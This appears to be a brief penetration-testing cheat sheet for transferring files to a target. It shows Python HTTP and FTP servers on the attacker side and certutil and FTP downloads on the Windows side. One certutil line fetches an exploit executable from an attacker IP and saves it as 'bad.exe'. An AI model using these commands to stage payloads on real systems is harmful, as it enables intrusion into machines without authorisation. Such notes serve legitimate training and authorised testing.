-- -
## Server 
-- -
#### HTTP
```powershell
python -m http.server 80 # if permission issues, do 8080 or 8000
python -m SimpleHTTPServer 80
```
#### FTP
```powershell
python -m pyftpdlib 21
```
## Download
-- -
#### HTTP
```powershell
# You can also open a broswer to you attack ip and get it that way
# I don't think the -f is necessary
certutil -urlcache http://<attack ip>/<filepath> <output file>
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```
#### FTP
```powershell
ftp <attack ip>
get file
```